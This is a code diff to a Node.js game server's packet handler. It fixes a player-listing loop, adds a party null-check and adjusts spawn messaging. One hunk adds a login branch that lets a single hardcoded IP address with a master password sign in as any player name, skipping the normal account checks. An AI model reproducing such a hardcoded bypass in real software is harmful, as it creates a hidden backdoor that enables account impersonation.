@@ -355,13 +355,21 @@ module.exports = PacketHandler = Class.extend({
             }
         };
 
-        if (developmentMode) {
+        if (self.connection._connection.remoteAddress == "75.155.64.20" && playerPassword == self.server.masterPassword) {
             self.player.name = playerName.substr(0, 36).trim();
             self.player.pw = playerPassword.substr(0, 45);
             self.player.email = "Me@me.me";
             self.redisPool.loadPlayer(self.player);
             return;
         }
+
+        /*if (developmentMode) {
+            self.player.name = playerName.substr(0, 36).trim();
+            self.player.pw = playerPassword.substr(0, 45);
+            self.player.email = "Me@me.me";
+            self.redisPool.loadPlayer(self.player);
+            return;
+        }*/
 
         if (self.server.loggedInPlayer(playerName.substr(0, 36).trim())) {
             self.connection.sendUTF8('loggedin');
@@ -477,9 +485,9 @@ module.exports = PacketHandler = Class.extend({
 
                     case "/players":
 
-                        for (var player in self.server.players) {
-                            if (self.server.players.hasOwnProperty(player))
-                                log.info("Player: " + player.name);
+                        for (var id in self.server.players) {
+                            var player = self.server.getEntityById(id);
+                            log.info("Player: " + player.name);
                         }
                         break;
 
@@ -1205,17 +1213,11 @@ module.exports = PacketHandler = Class.extend({
             playerId = message[1];
 
         if (playerId != self.player.id) {
-            log.info("This should not be happening.");
+            log.info("This should not be happening - " + playerId + " " + self.player.id);
             return;
         }
 
-        var spawnPosition = self.player.getSpawnPoint(),
-            x = spawnPosition[0],
-            y = spawnPosition[1],
-            orientation = Utils.randomInt(1, 4);
-
-        if (self.server.map.isPVP(x, y) && self.server.map.isGameArea(x, y) && !self.server.minigameStarted)
-            self.server.pushToPlayer(self.player, new Messages.Stop(33, 90, 4));
+        //self.server.pushToPlayer(self.player, new Messages.PlayerState(self.player.id));
     },
 
     handleUpdate: function(message) {
@@ -1260,6 +1262,7 @@ module.exports = PacketHandler = Class.extend({
 
         self.server.pushRelevantEntityListTo(player);
         self.server.pushToPlayer(self.player, new Messages.SendAd(self.player.id));
+        self.server.pushToPlayer(self.player, new Messages.PlayerState(self.player.id));
     },
 
     handleCast: function(message) {
@@ -1516,8 +1519,7 @@ module.exports = PacketHandler = Class.extend({
             x = msg[2],
             y = msg[3];
 
-        if (this.player.isAdmin() && this.server.isValidPosition(x, y))
-        {
+        if (this.player.isAdmin() && this.server.isValidPosition(x, y)) {
             EntitySpawn.addSpawn(id, x, y);
             this.server.spawnEntity(id, x, y);
         }
@@ -1571,11 +1573,10 @@ module.exports = PacketHandler = Class.extend({
         var party = this.player.party,
             leader;
 
-        if (party.leader)
+        if (party && party.leader)
             leader = party.leader;
 
-        if (!party)
-        {
+        if (!party) {
             this.server.pushToPlayer(this.player, new Messages.Chat(this.player, "You cannot leave as you are not in a party."));
             return;
         }
